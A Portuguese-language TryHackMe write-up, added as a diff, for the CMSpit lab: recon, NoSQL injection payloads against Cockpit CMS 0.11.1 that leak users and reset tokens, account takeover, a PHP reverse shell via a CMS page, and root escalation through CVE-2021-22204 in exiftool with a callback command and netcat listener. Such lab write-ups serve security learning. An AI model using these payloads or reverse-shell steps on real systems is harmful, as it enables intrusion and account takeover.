@@ -1,0 +1,210 @@
+# CMSpit - TryHackMe Writeup
+## Nanoxsec
+
+---
+
+## Reconhecimento
+
+### RustScan
+```
+Open 10.65.170.188:22
+Open 10.65.170.188:80
+```
+
+### Nmap
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-title: Authenticate Please!
+|_ Requested resource was /auth/login?to=/
+```
+
+---
+
+## Fuzzing de Diretórios
+
+Descobrindo o tamanho do falso positivo:
+```bash
+curl -s -o /dev/null -w "%{size_download}" http://10.65.170.188/naoexiste
+# retornou: 0
+```
+
+Rodando o ffuf filtrando falsos positivos:
+```bash
+ffuf -u http://10.65.170.188/FUZZ -H "Host: 10.65.170.188" -w ~/Downloads/Wordlists/admin.txt -i -ic -mc 200,301,302,401 -c -fs 300,0,100
+```
+
+Resultados relevantes:
+```
+install        [Status: 301]
+assets         [Status: 301]
+api/media      [Status: 401]
+api/content    [Status: 401]
+auth/login     [Status: 200]
+api/admin/     [Status: 401]
+composer.json  [Status: 200]
+```
+
+Todos os 301 redirecionam para: http://10.65.170.188/auth/login?to=/
+
+---
+
+## Identificação do CMS
+
+- CMS: **Cockpit**
+- Versão: **0.11.1** (encontrada em `/assets/app/css/style.css?ver=0.11.1`)
+
+---
+
+## Enumeração de Usuários
+
+### Endpoint 1: /auth/check (NoSQLi)
+
+Payload enviado via Burp:
+```json
+POST /auth/check HTTP/1.1
+Host: 10.65.170.188
+Content-Type: application/json
+
+{
+  "auth": {
+    "user": {"$func": "var_dump"},
+    "password": "admin"
+  },
+  "csfr": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"
+}
+```
+
+Resposta — vazou usuários e senhas:
+```
+string(5) "admin"
+string(12) "darkStar7471"
+string(5) "skidy"
+string(8) "ekoparty"
+{"success":false,"error":"User not found"}
+```
+
+### Endpoint 2: /auth/requestreset
+Confirmou dois usuários válidos: **admin** e **skidy**
+
+---
+
+## Reset de Senha via NoSQLi
+
+### Vazando tokens de reset
+
+Payload no `/auth/resetpassword`:
+```json
+POST /auth/resetpassword HTTP/1.1
+Host: 10.65.170.188
+Content-Type: application/json
+
+{
+  "token": {"$func": "var_dump"}
+}
+```
+
+Resposta:
+```
+string(48) "rp-f464aa4d7cced3812bd726395b2328f169dad22af257c"  --> admin
+string(48) "rp-1565f84d52f7480024bbb095387823b969dad51a1228c"  --> skidy
+string(48) "rp-42301f0cdae8fbd32e82e878dd0b905469dad17606b16"
+{"error": "404", "message":"File not found"}
+```
+
+### Resetando a senha
+
+```json
+POST /auth/resetpassword HTTP/1.1
+Host: 10.65.170.188
+Content-Type: application/json
+
+{
+  "token": "rp-1565f84d52f7480024bbb095387823b969dad51a1228c",
+  "password": "password1234"
+}
+```
+
+Resposta: `{"success":true,"message":"Password updated"}`
+
+Mesmo processo repetido para o admin.
+
+---
+
+## Acesso ao Painel Admin
+
+Logado com as credenciais resetadas.
+
+No `/finder` foi encontrada a **web flag**.
+
+---
+
+## Reverse Shell via Cockpit CMS
+
+Com acesso administrativo, foi criada uma nova página no CMS contendo uma reverse shell PHP. Ao acessar a URL da página criada, a shell foi recebida como usuário **stux**.
+
+---
+
+## Credenciais e Flag do Stux
+
+Dentro de `/home/stux` foi encontrado o arquivo `.dbshell` contendo:
+```
+Username: stux
+Password: p4ssw0rdhack3d!123
+```
+
+Flag do usuário obtida.
+
+---
+
+## Privesc para Root
+
+### Verificação do sudo
+```bash
+sudo -l
+# (root) NOPASSWD: /usr/local/bin/exiftool
+```
+
+### CVE-2021-22204 — ExifTool RCE como root
+
+O exiftool pode ser executado como root sem senha. A mesma vulnerabilidade usada para obter a shell inicial foi reaproveitada para escalar privilégios.
+
+#### Gerando a imagem maliciosa (na máquina atacante)
+```bash
+python3 exploitexiftool.py -s 192.168.200.114 1338
+```
+
+#### Listener
+```bash
+nc -lvnp 1338
+```
+
+#### Acionando o exiftool como root no servidor
+```bash
+sudo /usr/local/bin/exiftool image.jpg
+```
+
+Shell recebida como **root**.
+
+---
+
+## Flags
+
+| Flag | Localização |
+|------|------------|
+| Web Flag | /finder no painel Cockpit |
+| User Flag | /home/stux/.dbshell |
+| Root Flag | /root/root.txt |
+
+---
+
+## Ferramentas Utilizadas
+
+- rustscan / nmap
+- ffuf
+- Burp Suite
+- Script Python de enumeração de usuários (NoSQLi)
+- exploitexiftool.py (CVE-2021-22204)
+- djvulibre-bin (bzz, djvumake)
+- netcat
